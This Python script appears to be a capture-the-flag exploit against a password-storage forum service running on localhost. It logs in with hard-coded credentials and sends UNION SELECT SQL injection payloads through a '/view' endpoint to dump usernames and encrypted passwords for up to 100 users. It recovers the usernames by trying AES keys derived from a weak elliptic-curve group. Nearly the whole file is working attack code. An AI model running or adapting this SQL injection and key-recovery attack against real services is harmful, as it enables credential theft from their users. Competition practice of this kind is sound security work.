import requests
from Crypto.Cipher import AES
from sage.all import *
import hashlib

class ForumClient:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None

    def _set_auth_header(self):
        if self.token:
            self.session.headers.update({"Authorization": f"Bearer {self.token}"})
        else:
            self.session.headers.pop("Authorization", None)

    def register(self, username, password):
        """Регистрация нового пользователя"""
        response = self.session.post(
            f"{self.base_url}/register",
            json={"username": username, "password": password}
        )
        response.raise_for_status()
        return {"success": True}

    def login(self, username, password):
        """Вход и сохранение токена"""
        response = self.session.post(
            f"{self.base_url}/login",
            json={"username": username, "password": password}
        )
        response.raise_for_status()
        data = response.json()
        self.token = data["token"] 
        self._set_auth_header()
        return self.token

    def view_password(self, service):
        """Получение пароля по сервису (уязвимый endpoint /view)"""
        response = self.session.get(
            f"{self.base_url}/view",
            params={"service": service}  
        )
        response.raise_for_status()
        return response.json()

def point_to_aes_key(P):
    if P.is_zero():  
        raise ValueError("cannot derive key from infinity point")
    
    x = P[0]  
    y = P[1]  

    x_int = int(x)
    y_int = int(y)
    
    h = hashlib.sha256()
    h.update(x_int.to_bytes((x_int.bit_length() + 7) // 8, 'big'))
    h.update(y_int.to_bytes((y_int.bit_length() + 7) // 8, 'big'))
    return h.digest()

def ECC_keys_attack():
    p = 340282366920938463463374607431767211629
    a = 3
    b = 9
    r = 997
    Gx = 115423119360425591167519108349272384530
    Gy = 26739966749909391609878417468245881872
    F=GF(p)
    E=EllipticCurve(F, [a,b])
    G=E(Gx, Gy)
    n=G.order()
    keys=[]
    P=G
    for i in range(n):
        try:
            keys.append(point_to_aes_key(P))
            P=P+G
        except:
            continue
    return keys


def attack():
    session=ForumClient()
    session.login('kustkznnz', '12345678')
    userid=0
    keys=ECC_keys_attack()
    print('start work')
    while userid<100:
        userid+=1
        try:
            for i in range(16):
                try:
                    log=session.view_password("' UNION SELECT CONCAT(HEX(username), '"+"aa"*i+"') FROM users WHERE id="+str(userid)+" #")['password']
                except:
                    continue
                count=i*2
                break
            print('login_find', log)
            for j in keys:
                cipher=AES.new(j, AES.MODE_ECB)
                text=cipher.encrypt(bytes.fromhex(log))
                if text.hex()[-count:] == 'a'*count:
                    login=bytes.fromhex(text.hex()[:-count])
                    break
            print('login decrypted')
            services=['VK', 'Twitter', 'Instagram', 'Facebook']
            for s in services:
                try:
                    password=session.view_password("' UNION SELECT encrypted_password FROM passwords WHERE user_id="+str(userid)+" AND service='"+s+"' #")['password']
                    print(f'service {s}, login:{login}, password:{password}')
                except:
                    continue
        except:
            continue
    

attack()